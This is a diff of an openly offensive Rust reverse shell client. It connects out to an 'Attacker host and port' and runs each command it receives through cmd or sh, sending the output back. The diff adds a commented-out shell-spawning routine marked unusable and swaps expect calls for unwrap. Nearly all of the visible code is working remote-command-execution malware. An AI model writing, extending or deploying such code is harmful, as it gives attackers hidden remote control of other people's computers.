@@ -5,6 +5,12 @@ use std::process::Command;
 use std::time::Duration;
 use std::thread;
 
+/*
+fn spawn_shell() {
+	let mut child = Command::new("sh").spawn().unwrap();
+	child.wait();
+}*/
+
 fn main() {
 	let addr = "127.0.0.1:8888"; // Attacker host and port. EDIT here
 	loop {
@@ -23,12 +29,16 @@ fn main() {
 							}
 							else if command == "killself\n" {
 								return;
-							}
+							} /*
+							else if command == "spawn_shell\n"{
+								/* Unusable */
+								spawn_shell();
+							}*/
 							else {
 								let output = if cfg!(target_os = "windows") {
-									Command::new("cmd").args(&["/C", command]).output().expect("")
+									Command::new("cmd").args(&["/C", command]).output().unwrap()
 								} else {
-									Command::new("sh").arg("-c").arg(command).output().expect("")
+									Command::new("sh").arg("-c").arg(command).output().unwrap()
 								};
 								conn.write(&output.stdout).unwrap();
 							}
